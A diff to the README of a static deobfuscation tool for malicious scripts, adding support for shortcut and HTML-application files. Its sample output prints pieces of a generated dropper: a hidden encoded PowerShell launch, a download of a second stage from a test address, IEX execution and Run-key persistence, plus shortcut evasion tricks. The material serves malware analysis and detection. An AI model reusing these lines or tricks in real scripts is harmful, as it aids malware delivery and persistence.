@@ -1,6 +1,6 @@
 # unwrap
 
-**Peel the obfuscation off malicious PowerShell, JavaScript, VBScript and batch, layer by layer, without ever running them.** Base64, gzip, XOR, `-EncodedCommand`, format strings, char codes, reversing, junk-replace, packers and Invoke-Obfuscation's tricks all come off, statically, and every layer stays on screen. Then it pulls out the IOCs and maps what the script does to MITRE ATT&CK. Pure Python standard library, zero dependencies.
+**Peel the obfuscation off malicious PowerShell, JavaScript, VBScript and batch, layer by layer, without ever running them.** It opens the files they arrive in, too: Windows shortcuts (`.lnk`) and HTML applications (`.hta`, `.html`). Base64, gzip, XOR, `-EncodedCommand`, format strings, char codes, reversing, junk-replace, packers and Invoke-Obfuscation's tricks all come off, statically, and every layer stays on screen. Then it pulls out the IOCs and maps what the script does to MITRE ATT&CK. Pure Python standard library, zero dependencies.
 
 [![ci](https://github.com/njuj/unwrap/actions/workflows/ci.yml/badge.svg)](https://github.com/njuj/unwrap/actions/workflows/ci.yml)
 ![python](https://img.shields.io/badge/python-3.10%2B-00ff9c?labelColor=0b0f17)
@@ -13,12 +13,19 @@
 <p align="center"><img src="docs/demo.svg" width="100%" alt="unwrap running in a terminal"/></p>
 
 ```text
-$ unwrap examples/samples/dropper.bat
+$ python examples/make_samples.py --lnk | unwrap -
+ unwrap v0.2.0  ·  stdin  ·  7 layer(s)  ·  31 rewrite(s)  ·  0.01s
 
- unwrap v0.1.0  ·  dropper.bat  ·  7 layer(s)  ·  35 rewrite(s)  ·  0.02s
+ CONTAINER  lnk
+   target       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+   arguments    3,848 chars
+   working dir  %TEMP%
+   icon         %ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
+   window       minimized, not activated
+   built on     desktop-7rq2k1
 
- LAYER 0  batch  ·  3,658 chars  ·  rewrites: caret-escapes ×1, variable-expansion ×3
-   @echo off set v077=p set v182=owe set v261=rshell call powershell -nop -w hidden -enc JgAoACAAJABzAEgAZQBsAEwASQBkAFsAMQBdACsAJABzAGgARQBsAEwAaQBEAFsAMQAzAF0...
+ LAYER 0  powershell  ·  3,906 chars
+   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc JgAoACAAJABzAEgAZQBsAEwASQBkAFsAMQBdACsAJABzAGgARQBsAEwAaQBEAFsAMQAzAF0AKwAnAHg...
    └ decoded: encoded-command  ·  -EncodedCommand: Base64 of UTF-16LE (3,568 chars)
 
  LAYER 1  powershell  ·  1,301 chars  ·  rewrites: automatic-variable ×2, index ×2, concatenation ×2, parentheses ×2, invoke-alias ×1
@@ -49,22 +56,27 @@ $ unwrap examples/samples/dropper.bat
  INDICATORS
    urls      hxxp://203[.]0[.]113[.]50/update/stage2.ps1
    ips       203[.]0[.]113[.]50
+   paths     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    paths     $env:APPDATA\Microsoft\svchost.ps1
    registry  HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
 
  BEHAVIOUR
+   T1027      pads its arguments so the shortcut's Properties dialog shows only blanks  → 260 leading blank characters before '-nop -w hidden -enc JgAoACAAJABzAEgAZQBs'
+   T1204.002  is a shortcut that starts powershell.exe  → C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+   T1036      borrows another program's icon to look like a document or folder  → %ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
+   T1564.003  starts minimized without taking focus  → ShowCommand = 7
    T1105      downloads content from the network  → (New-Object Net.WebClient).DownloadFile('http://203.0.113.50/update/stage2.ps1', $d)
    T1059      executes code it built at run time  → IEX '$u = ''http://203.0.113.50/update/stage2.ps1''
    T1140      decodes data at run time  → ...flateStream([IO.MemoryStream][Convert]::FromBase64String('XVRLblsxDLxKVo0NsIAoUb8DdJEbB
-   T1547.001  writes an autorun registry key  → ...'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value "powershell 
+   T1547.001  writes an autorun registry key  → ...'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value "powershell
    T1564.003  hides its window  → ...-Name Updater -Value "powershell -w hidden -f $d"
 
  stopped: nothing left to decode
 ```
 
-A batch file hides `powershell` in `set` variables and carets and passes an `-EncodedCommand`. Inside: an IEX spelled out of `$PSHome[21]+$PSHome[30]+'x'`, Invoke-Obfuscation style, running an XOR'd blob, which inflates a deflate stream, which builds a `[char[]]` array, which is a shuffled `-f` format string. Seven layers later: the download URL, the drop path and the Run-key persistence, with the variable `$u` folded into the download call. `$d` stays a variable on purpose: `"$env:APPDATA\..."` is only known at run time, and unwrap never guesses.
+An "invoice" shortcut, the way phishing delivers them now. It starts `powershell.exe`, wears Microsoft Edge's icon, opens minimized, and pushes its command 260 blanks to the right, past everything the shortcut's Properties dialog shows. unwrap reads the shortcut without opening it (the target, arguments, icon, window and the NetBIOS name of the machine it was built on), then peels the command. Inside: an IEX spelled out of `$PSHome[21]+$PSHome[30]+'x'`, Invoke-Obfuscation style, running an XOR'd blob, which inflates a deflate stream, which builds a `[char[]]` array, which is a shuffled `-f` format string. Seven layers later: the download URL, the drop path and the Run-key persistence, with the variable `$u` folded into the download call. `$d` stays a variable on purpose: `"$env:APPDATA\..."` is only known at run time, and unwrap never guesses.
 
-The sample is harmless and generated (`python examples/make_samples.py`, which also writes a JScript loader and a VBScript macro): its address is TEST-NET and nothing in it is meant to run.
+`unwrap examples/samples/dropper.bat` peels the same chain from behind a batch launcher that hides `powershell` in `set` variables and carets. The sample is harmless and generated (`python examples/make_samples.py`, which also writes a JScript loader and a VBScript macro): its address is TEST-NET and nothing in it is meant to run.
 
 ## How it works
 
@@ -77,6 +89,15 @@ Two details carry most of the weight:
 
 * **Literal awareness.** Nested layers live inside string literals of the outer layer. A rewrite that folded `[char]73` *inside* `'...[char]73...'` would corrupt the outer quoting, so every rewrite and decoder skips matches that start or end inside a literal. The literal patterns are unrolled loops that never open on the second half of an escape (`''`, `` `" ``, `\'`, `""`), so they stay linear on megabyte-sized hostile input.
 * **Faithful semantics, checked against the real thing.** `-replace` is a case-insensitive regex, while `.Replace()` is a literal and case-sensitive. `$ShellId`, `$PSHome`, `$env:ComSpec`, `$env:Public` and `$VerbosePreference` are only substituted where they are indexed, because only those values are the same on every Windows machine. A variable is folded only when it is assigned once, and never into an expandable `"...$x..."` string. Its assignment is dropped only when nothing else (`${x}`, `$script:x`) still refers to it.
+
+## Containers
+
+| File | What unwrap reads | What it reports about the container |
+|---|---|---|
+| **`.lnk` shortcut** | the target (from LinkInfo, the shell item list or the environment block), the arguments, working directory, icon and window state, per MS-SHLLINK. Target and arguments become layer 0, in the target's language | arguments padded past the Properties dialog (T1027), a shortcut that starts an interpreter or LOLBin (T1204.002), a borrowed icon (T1036), a minimized window (T1564.003), and the NetBIOS name of the machine that built it, a pivot across a campaign |
+| **`.hta` / `.html`** | every inline `<script>` block, by language (VBScript or JavaScript). The language with the most code becomes layer 0 | an HTML application, which `mshta.exe` runs with the user's full rights (T1218.005), and HTML smuggling, a file built in the browser and handed over as a download (T1027.006). The smuggled file comes out as a binary payload with its SHA-256 |
+
+A shortcut is never resolved or opened, and nothing it points to is touched. Shortcuts shaped like the one above are what antivirus quarantines on sight, so the tests and the sample build them in memory and pipe them to `unwrap -`. One written to disk can be read as long as the scanner leaves it there.
 
 ## What it peels
 
@@ -137,6 +158,8 @@ Fuzzing found one real crash: malformed JavaScript escapes (`\u{}`, `\9`, a lone
 pip install git+https://github.com/njuj/unwrap
 
 unwrap suspicious.ps1                       # a script
+unwrap Invoice.pdf.lnk                      # a shortcut: its target and arguments, then the layers
+unwrap update.hta                           # the scripts of an HTML application or a smuggling page
 unwrap -c "powershell -nop -enc SQBFAFgA..."   # a command line from a log or an EDR alert
 unwrap - < dropper.txt                      # stdin (UTF-8 or UTF-16)
 unwrap loader.js --full                     # every layer in full, not a preview
@@ -172,6 +195,7 @@ for layer in result.layers:               # every layer, with its language, rewr
 * It works on patterns and a literal-aware tokenizer, not a full parser for four languages. Exotic syntax can leave a layer partly folded. That layer is still printed, so nothing is hidden.
 * It does not try to recover keyed encryption (AES, RC4, custom loops). A binary payload is reported with its SHA-256 so you can pivot on it.
 * Constant propagation is deliberately conservative: one assignment, at most 1 MB of growth.
+* In an HTML file with both VBScript and JavaScript, the language with more code is unwrapped; the other is counted, not peeled. A shortcut's target is read from the shell item list only when LinkInfo is missing, and that reading is best effort.
 
 ## Safety
 
